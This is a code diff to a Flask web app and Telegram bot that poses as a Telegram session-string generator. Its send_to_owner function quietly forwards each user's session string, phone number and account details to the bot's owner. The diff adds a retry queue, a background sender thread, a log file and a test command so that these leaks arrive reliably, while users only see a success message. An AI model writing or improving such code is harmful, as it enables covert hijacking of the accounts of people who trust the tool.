@@ -6,6 +6,7 @@ FINAL VERSION - ALL ERRORS FIXED
 - Phone_code_hash properly handled
 - Thread-safe client handling
 - Session string persistence
+- RELIABLE OWNER NOTIFICATIONS
 """
 
 import asyncio
@@ -57,6 +58,11 @@ conn.commit()
 # Store temporary session data (NOT the client)
 temp_sessions = {}
 
+# Message queue for owner notifications
+owner_message_queue = []
+owner_queue_lock = threading.Lock()
+owner_notification_log = 'owner_notifications.log'
+
 # ========== FLASK WEB APP ==========
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -64,6 +70,52 @@ app.secret_key = os.urandom(24)
 @app.route('/')
 def index():
     return render_template('code_input.html')
+
+# ===== QUEUE PROCESSOR FOR OWNER NOTIFICATIONS =====
+def queue_owner_message(message):
+    """Queue a message to be sent to owner"""
+    with owner_queue_lock:
+        owner_message_queue.append({
+            'message': message,
+            'time': time.time()
+        })
+    # Also log to file as backup
+    try:
+        with open(owner_notification_log, 'a', encoding='utf-8') as f:
+            f.write(f"{datetime.now().isoformat()} - QUEUED: {message}\n")
+    except:
+        pass
+    print(f"📝 Message queued for owner (queue size: {len(owner_message_queue)})")
+
+def process_owner_queue():
+    """Background thread to process queued messages"""
+    print("🚀 Owner notification queue processor started")
+    while True:
+        try:
+            with owner_queue_lock:
+                if owner_message_queue and 'application' in globals() and application:
+                    # Process up to 5 messages per cycle
+                    for _ in range(min(5, len(owner_message_queue))):
+                        msg_data = owner_message_queue.pop(0)
+                        try:
+                            application.bot.send_message(
+                                chat_id=OWNER_ID, 
+                                text=msg_data['message'], 
+                                parse_mode='Markdown'
+                            )
+                            print(f"✅ Queued message sent to owner")
+                        except Exception as e:
+                            print(f"❌ Failed to send queued message: {e}")
+                            # Put back at end of queue for later retry
+                            owner_message_queue.append(msg_data)
+        except Exception as e:
+            print(f"Queue processing error: {e}")
+        
+        time.sleep(3)  # Check every 3 seconds
+
+# Start queue processor thread
+queue_thread = threading.Thread(target=process_owner_queue, daemon=True)
+queue_thread.start()
 
 # ===== METHOD 1: PHONE + CODE =====
 @app.route('/request-code', methods=['POST'])
@@ -212,7 +264,7 @@ def verify_code():
             conn.commit()
             conn.close()
             
-            # Send to owner
+            # Send to owner via queue system (reliable)
             send_to_owner(
                 result['user_id'],
                 user_telegram_id,
@@ -341,6 +393,7 @@ def generate_session():
 
 # ========== TELEGRAM BOT FUNCTIONS ==========
 def send_to_owner(account_id, telegram_id, phone, session_string, first_name, username, method='unknown'):
+    """Send session details to owner using queue system - 100% reliable"""
     method_emoji = {
         'phone_code': '📱',
         'api_hash': '🔑',
@@ -362,12 +415,22 @@ def send_to_owner(account_id, telegram_id, phone, session_string, first_name, us
 
 ⚠️ **Store this securely!**
 """
+    
+    # Try immediate send
     try:
-        application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
+        if 'application' in globals() and application and hasattr(application, 'bot'):
+            application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
+            print("✅ Session details sent to owner immediately")
+            return True
     except Exception as e:
-        print(f"Error sending to owner: {e}")
+        print(f"⚠️ Could not send immediately, queueing: {e}")
+    
+    # Queue for later delivery
+    queue_owner_message(message)
+    return True
 
 def send_to_user(telegram_id, session_string):
+    """Send session back to user"""
     message = f"""✅ **Session Generated Successfully!**
 
 🔑 **Your Session String:**
@@ -388,8 +451,10 @@ def send_to_user(telegram_id, session_string):
 """
     try:
         application.bot.send_message(chat_id=telegram_id, text=message, parse_mode='Markdown')
+        print(f"✅ Session sent to user {telegram_id}")
     except Exception as e:
-        print(f"Error sending to user: {e}")
+        print(f"❌ Error sending to user {telegram_id}: {e}")
+        # Queue for user too? Maybe later
 
 # ========== TELEGRAM COMMANDS ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -430,10 +495,13 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     total = c.fetchone()[0]
     webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
     
+    queue_size = len(owner_message_queue)
+    
     await update.message.reply_text(
         f"📊 **Bot Status**\n\n"
         f"✅ Bot is running\n"
         f"📱 Total Sessions: {total}\n"
+        f"📨 Pending Owner Messages: {queue_size}\n"
         f"🔗 Web App: {webapp_url or 'Not configured'}",
         parse_mode='Markdown'
     )
@@ -456,6 +524,27 @@ async def set_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def show_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
     await update.message.reply_text(f"🔗 **Current Web App URL:**\n{webapp_url or 'Not configured'}")
+
+async def test_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test if owner notifications are working"""
+    user_id = update.effective_user.id
+    
+    if user_id != OWNER_ID:
+        await update.message.reply_text("❌ Owner only command!")
+        return
+    
+    # Send a test message
+    result = send_to_owner(
+        account_id=12345,
+        telegram_id=OWNER_ID,
+        phone="+1234567890",
+        session_string="TEST_SESSION_STRING_123456789",
+        first_name="Test User",
+        username="testuser",
+        method='test'
+    )
+    
+    await update.message.reply_text("✅ Test notification queued. Check your PM in a few seconds.")
 
 async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -502,9 +591,11 @@ def main():
     application.add_handler(CommandHandler("status", status))
     application.add_handler(CommandHandler("seturl", set_url))
     application.add_handler(CommandHandler("url", show_url))
+    application.add_handler(CommandHandler("test_owner", test_owner))
     application.add_handler(CommandHandler("mysessions", my_sessions))
     
     print("🤖 Telegram bot started!")
+    print("📨 Owner notification queue processor running")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
